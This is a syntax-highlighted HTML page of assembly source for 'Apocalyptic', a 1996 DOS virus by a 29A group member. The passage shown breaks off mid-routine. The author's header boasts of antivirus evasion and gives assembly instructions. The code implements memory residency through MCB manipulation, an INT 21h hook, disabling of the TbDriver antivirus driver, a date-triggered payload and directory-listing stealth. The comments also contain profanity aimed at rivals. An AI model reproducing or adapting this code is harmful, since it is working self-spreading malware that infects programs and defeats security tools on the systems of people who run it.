<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.DOS.Wintermute.1052 - virus.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;   Virus name:     Apocalyptic</span><span class="sc0">
</span><span class="sc1">;   Author:         WiNTeRMuTe/29A</span><span class="sc0">
</span><span class="sc1">;   Size:           1058 bytes</span><span class="sc0">
</span><span class="sc1">;   Origin:         Madrid, Spain</span><span class="sc0">
</span><span class="sc1">;   Finished:       October, 1996 ( with a pair of corrections after that )</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Characteristics and curiosities</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   - TSR appending Com/Exe infector</span><span class="sc0">
</span><span class="sc1">;   - Has a routine to encrypt and another to decrypt ( ror+add+xor )</span><span class="sc0">
</span><span class="sc1">;   - Stealth ( 11h/12h/4eh/4fh/5700h )</span><span class="sc0">
</span><span class="sc1">;   - Deactivates Tbdriver when going into mem and when infecting</span><span class="sc0">
</span><span class="sc1">;   - Makes the int 3h point to the int21h on infection</span><span class="sc0">
</span><span class="sc1">;   - Fools f-prot's 'stealth detection'</span><span class="sc0">
</span><span class="sc1">;   - Non-detectable ( in 2nd generation ) by Tbav 7.05, F-prot 2.23c, Scan,</span><span class="sc0">
</span><span class="sc1">; Avp and else. TbClean doesn't clean it ( it gets lost with the Z Mcb</span><span class="sc0">
</span><span class="sc1">; searching loop,... really that product is a shit )</span><span class="sc0">
</span><span class="sc1">;   - Payload: On 26th of July it shows all file with size 029Ah ( 666 )</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Thanks go to:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   - All the 29A staff; rulez ! Specially in the spanish scene to MrSandman,</span><span class="sc0">
</span><span class="sc1">;  VirusBuster, Griyo, Mr.White, Avv, Anibal and ORP</span><span class="sc0">
</span><span class="sc1">;   - Living Turmoil, specially Warblade and Krackbaby... go on with the mags!</span><span class="sc0">
</span><span class="sc1">;   - H/P/C/A/V people in my bbs like Patuel, the Black Rider, MegaMan,</span><span class="sc0">
</span><span class="sc1">; Bitspawn, Netrunner, the S.H.E.... and of course to my sysop 'Uni' and the</span><span class="sc0">
</span><span class="sc1">; other cosysops...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       And fucks go to:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   - Some Fidoasses. They know who they are.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                  ฤอออออออออออออออออออออออออออออออออออฤ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                  " Why don't you get a life and grow up,</span><span class="sc0">
</span><span class="sc1">;                why don't you realize that you're fucked up,</span><span class="sc0">
</span><span class="sc1">;                  why criticize what you don't understand,</span><span class="sc0">
</span><span class="sc1">;                   why change my words, you're so afraid "</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                              ( Sepultura )</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                       ฤอออออออออออออออออออออออออฤ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   To assemble the virus, use:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Tasm virus.asm</span><span class="sc0">
</span><span class="sc1">;   Tlink virus.obj</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc2">.286</span><span class="sc0">
</span><span class="sc5">HOSTSEG</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0">
</span><span class="sc9">ASSUME</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">HOSTSEG</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SS</span><span class="sc4">:</span><span class="sc5">CODIGO</span><span class="sc0">

</span><span class="sc5">Host</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4c00h</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">CODIGO</span><span class="sc0">  </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">PARA</span><span class="sc0">
</span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">CODIGO</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">CODIGO</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SS</span><span class="sc4">:</span><span class="sc5">CODIGO</span><span class="sc0">

</span><span class="sc5">virus_size</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">virus_end</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc0">
</span><span class="sc5">encrypt_size</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">encrypt_end</span><span class="sc4">-</span><span class="sc5">encrypt_start</span><span class="sc0">

</span><span class="sc5">virus_start</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">0h</span><span class="sc0">

</span><span class="sc5">Letsrock</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">delta</span><span class="sc0">                   </span><span class="sc1">; Entry for Com/Exe</span><span class="sc0">
</span><span class="sc5">delta</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">                   </span><span class="sc1">; ๋-offset</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">tomacha</span><span class="sc0">                 </span><span class="sc1">; I don't call encryption</span><span class="sc0">
                                                </span><span class="sc1">;on first generation</span><span class="sc0">

</span><span class="sc5">Encrypt_start</span><span class="sc0">   </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc1">;***************************************************************************</span><span class="sc0">
</span><span class="sc1">;                                RESIDENCE</span><span class="sc0">
</span><span class="sc1">;***************************************************************************</span><span class="sc0">


</span><span class="sc5">goon</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">tbdriver</span><span class="sc0">                </span><span class="sc1">; Deactivate TbDriver</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">52h</span><span class="sc0">                  </span><span class="sc1">; Pick list of lists</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; First MCB</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">

</span><span class="sc5">Mcb_Loop</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc12">'Z'</span><span class="sc0">     </span><span class="sc1">; I search last Mcb.</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">got_last</span><span class="sc0">
</span><span class="sc5">cont</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Mcb_Loop</span><span class="sc0">

</span><span class="sc5">got_last</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">      </span><span class="sc1">; Is it free ?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">go_on</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">      </span><span class="sc1">; Or with active Psp ?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">exit</span><span class="sc0">
</span><span class="sc5">go_on</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">3</span><span class="sc4">],((</span><span class="sc5">virus_size</span><span class="sc4">+</span><span class="sc2">15</span><span class="sc4">)/</span><span class="sc2">16</span><span class="sc4">)+</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">exit</span><span class="sc0">                    </span><span class="sc1">; Is there space for me ?</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                      </span><span class="sc1">; If there is, I get resident</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Residence stuff; nothing</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,((</span><span class="sc5">virus_size</span><span class="sc4">+</span><span class="sc2">15</span><span class="sc4">)/</span><span class="sc2">16</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">;special</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsw</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">3</span><span class="sc4">],((</span><span class="sc5">virus_size</span><span class="sc4">+</span><span class="sc2">15</span><span class="sc4">)/</span><span class="sc2">16</span><span class="sc4">)+</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc12">'M'</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">3</span><span class="sc4">],((</span><span class="sc5">virus_size</span><span class="sc4">+</span><span class="sc2">15</span><span class="sc4">)/</span><span class="sc2">16</span><span class="sc4">)+</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosb</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">virus_size</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3521h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int21h</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int21h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">25h</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">main_center</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc1">;***************************************************************************</span><span class="sc0">
</span><span class="sc1">;                              RETURN TO HOST</span><span class="sc0">
</span><span class="sc1">;***************************************************************************</span><span class="sc0">

</span><span class="sc5">exit</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">flag</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; Was it a Com ?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">era_un_com</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">                   </span><span class="sc1">; Recover stack</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ss_sp</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">cli</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ss_sp</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">                   </span><span class="sc1">; Recover CS:IP</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">cs_ip</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">cs_ip</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">retf</span><span class="sc0">                            </span><span class="sc1">; Return to host</span><span class="sc0">

</span><span class="sc5">era_un_com</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">                 </span><span class="sc1">; If it's a Com, I make</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">                      </span><span class="sc1">;it to return</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">ss_sp</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">
                </span><span class="sc6">movsb</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">condiciones</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">; Payload trigger</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">02ah</span><span class="sc0">                 </span><span class="sc1">; Activates on 26th july</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">071Ah</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">nain</span><span class="sc0">
                </span><span class="sc6">stc</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">nain</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">clc</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;***************************************************************************</span><span class="sc0">
</span><span class="sc1">;                                TBDRIVER</span><span class="sc0">
</span><span class="sc1">;***************************************************************************</span><span class="sc0">

</span><span class="sc5">Tbdriver</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; Annulates TBdriver,...</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">;really, this Av is a</span><span class="sc0">
                </span><span class="sc6">les</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0084h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;megashit.</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0eah</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">volvamos</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0086h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0084h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">volvamos</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;***************************************************************************</span><span class="sc0">
</span><span class="sc1">;                            STEALTH 05700h</span><span class="sc0">
</span><span class="sc1">;***************************************************************************</span><span class="sc0">

</span><span class="sc5">Stealth_tiempo</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Int21h</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Calls Int21h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">01fh</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">01fh</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">nada</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">01fh</span><span class="sc0">                 </span><span class="sc1">; Changes seconds</span><span class="sc0">
</span><span class="sc5">nada</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">

</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;                               FCB STEALTH</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">FCB_Stealth</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">pushf</span><span class="sc0">                           </span><span class="sc1">; Stealth of 11h/12h, by</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Int21h</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;FCBs</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">sin_stealth</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">51h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
